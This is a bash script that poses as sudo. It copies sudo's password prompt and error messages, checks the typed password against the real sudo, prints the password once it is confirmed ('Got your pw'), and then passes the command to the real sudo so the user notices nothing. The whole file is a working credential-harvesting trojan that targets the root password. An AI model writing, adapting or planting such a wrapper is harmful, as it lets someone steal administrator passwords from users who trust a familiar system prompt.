#!/bin/bash

/usr/bin/sudo -k

trap ctrl_c SIGINT

function ctrl_c() {
    if [ $state -eq 1 ];
    then
        # waiting for sudo to return, just kill it and continue
        return
    fi

    # otherwise, we were waiting in the password prompt
    echo ""
    if [ $i -ne 0 ];
    then
        echo "sudo: $i incorrect password attempt"
    fi
    stty echo
    exit
}

state=0

for i in `seq 0 2`;
do

    state=0
    read -s -p "[sudo] password for $USER: " rootpw
    state=1
    echo ""

    echo $rootpw | /usr/bin/sudo -S /bin/true 2> /dev/null
    sudores=$?

    if [ $sudores -eq 1 ];
    then
	    # failed pw
        echo "Sorry, try again.";
    elif [ $sudores -eq 0 ];
    then
        echo "Got your pw: $rootpw"
        /usr/bin/sudo $@
        exit
    fi

done

echo "sudo: 3 incorrect password attempts"
